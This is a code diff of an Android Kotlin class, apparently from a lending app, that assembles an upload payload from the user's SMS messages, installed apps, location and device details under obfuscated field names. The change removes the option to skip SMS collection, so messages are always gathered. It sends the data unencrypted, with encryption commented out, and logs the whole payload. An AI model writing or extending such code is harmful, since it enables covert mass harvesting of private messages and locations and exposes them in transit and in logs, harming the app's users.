@@ -65,18 +65,18 @@ class MCLCManager {
             return currentTime - one_year
         }
 
-        private fun getCashInfo(smsUpload: Boolean = true): JsonObject {
+        private fun getCashInfo(): JsonObject {
             val listener = BigDataManager.get().getNetDataListener() ?: return JsonObject()
             val ctx = listener.getContext()
             val jsonObject = JsonObject()
             try {
                 // 短信
-                val sms = if (smsUpload) SmsHelper.getMessage(ctx) else arrayListOf()
-                jsonObject.addProperty("MGTnhn", GsonUtil.toJson(sms).orEmpty())
+                jsonObject.addProperty("MGTnhn", GsonUtil.toJson(SmsHelper.getMessage(ctx)))
             } catch (e: Exception) {
             } catch (e: OutOfMemoryError) {
             }
             try {
+                // app list
                 jsonObject.add("bPp7hQmh", DevicesAppHelper.getAppList())
             } catch (e: Exception) {
             } catch (e: OutOfMemoryError) {
@@ -89,11 +89,11 @@ class MCLCManager {
             } catch (e: OutOfMemoryError) {
             }
 
-            try {
-                jsonObject.add("calendar", CalendarHelper.getCalendarEvent(ctx))
-            } catch (e: Exception) {
-            } catch (e: OutOfMemoryError) {
-            }
+//            try {
+//                jsonObject.add("calendar", CalendarHelper.getCalendarEvent(ctx))
+//            } catch (e: Exception) {
+//            } catch (e: OutOfMemoryError) {
+//            }
             // 定位
             try {
                 val locationInfo = LocationHelp.getLocationInfo()
@@ -105,14 +105,15 @@ class MCLCManager {
             }
             // 设备信息
             try {
-                val locationInfo = LocationHelp.getLocationInfo()
-                val jobj = JsonObject()
-                jobj.addProperty("l9uzoD39Q8", Build.MODEL)
-                jobj.addProperty("TAEgE", Build.BRAND)
-                jobj.addProperty("OCwx", Build.ID)
-                jobj.addProperty("uXBlXBew", locationInfo?.first)
-                jobj.addProperty("u3zNZE", locationInfo?.second)
-                jsonObject.add("CEewmJPFFR", jobj)
+//                jobj.addProperty("l9uzoD39Q8", Build.MODEL)
+//                jobj.addProperty("TAEgE", Build.BRAND)
+//                jobj.addProperty("OCwx", Build.ID)
+//                jobj.addProperty("uXBlXBew", locationInfo?.first)
+//                jobj.addProperty("u3zNZE", locationInfo?.second)
+                jsonObject.addProperty(
+                    "CEewmJPFFR",
+                    GsonUtil.toJson(DevicesHelper.getDevicesInfo(ctx)).orEmpty()
+                )
             } catch (e: Exception) {
             }
 
@@ -152,12 +153,12 @@ class MCLCManager {
                 val beforePostInfo = jsonCashInfo.toString()
                 logger_i(TAG, "cash info post encryt before = $beforePostInfo")
                 val zipInfo = GzipUtils.zip(beforePostInfo)
-        //                    ${zipInfo.size / 1024f}
+                //                    ${zipInfo.size / 1024f}
                 logger_i(
                     TAG,
                     "cash info post encryt gzip size befor = ${beforePostInfo.toByteArray().size / 1024f} , after = "
                 )
-        //        val postInfo = AESNormalUtil.mexicoEncrypt(zipInfo)
+                //        val postInfo = AESNormalUtil.mexicoEncrypt(zipInfo)
                 val postInfo = beforePostInfo
                 logger_i(TAG, "cash info post encryt after = $postInfo")
                 doEvent(EventKeyManager.ConstantDot.EVENT_RESULT_UPLOAD)
